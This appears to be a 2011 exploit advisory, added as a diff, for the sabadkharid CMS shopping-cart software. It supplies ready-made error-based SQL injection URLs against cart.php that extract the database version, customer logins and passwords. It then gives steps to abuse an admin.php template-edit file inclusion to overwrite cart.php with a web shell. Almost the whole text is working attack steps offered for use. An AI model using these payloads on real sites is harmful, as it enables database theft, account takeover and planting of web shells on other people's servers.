@@ -1,0 +1,50 @@
+=========================================================
+sabadkharid CMS Multiple Vulnerabilities
+=========================================================
+
+# Exploit Title: sabadkharid CMS Multiple Vulnerabilities
+# Date: 8/07/2011
+# Author: hosinn
+# Software Link: http://www.sabadkharid.com
+# Version: professional edition
+# Platform / Tested on: Multiple
+# Category: webapplications
+# Code : N/A
+# Download Video: http://hosinn.persiangig.com/video/sabadkharid.rar
+# BUG Sql Injectin : ###############################################################
+
+1 > cart.php have sql injection bug .
+
+2 > go to http://target.com/cart.php?shopping_cart&add2cart=10'
+
+
+# Expolite : #######################################################################
+
+1 > get version => http://site.com/cart.php?shopping_cart&add2cart=10 /*!and(select 1 from(select count(*),concat((select (select @@version) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1*/
+
+2 > get username => http://site.com/cart.php?shopping_cart&add2cart=10 /*!and(select 1 from(select count(*),concat((select (select login) from SKH_customers limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1*/
+
+ > output like 'admin1' and username:admin
+
+3 > get password => http://site.com/cart.php?shopping_cart&add2cart=10 /*!and(select 1 from(select count(*),concat((select (select cust_password) from SKH_customers limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and 1=1*/
+
+ > output like 'pass1' and username:pass
+ 
+4 > Then Login To Site
+
+# BUG LFI : ######################################################################
+
+1 > Go To Http://site.com/admin.php
+
+2 > Go To Http://site.com/admin.php?tab=conf?=template&edit=../../../cart.php
+
+3 > Then Copy Your Shell script & Save
+
+4 > Find Your Shell in Http://site.com/cart.php
+
+
+#############################################################################
+Our Website : http://www.nopotm.ir
+Special Thanks to : H-SK33PY , Immortal Boy , BigB4NG , N3td3v!l ,
+Blacksun , Drosera^Cqq47 , NOPO , zilli0o0n & all iranian NOPO members
+#############################################################################
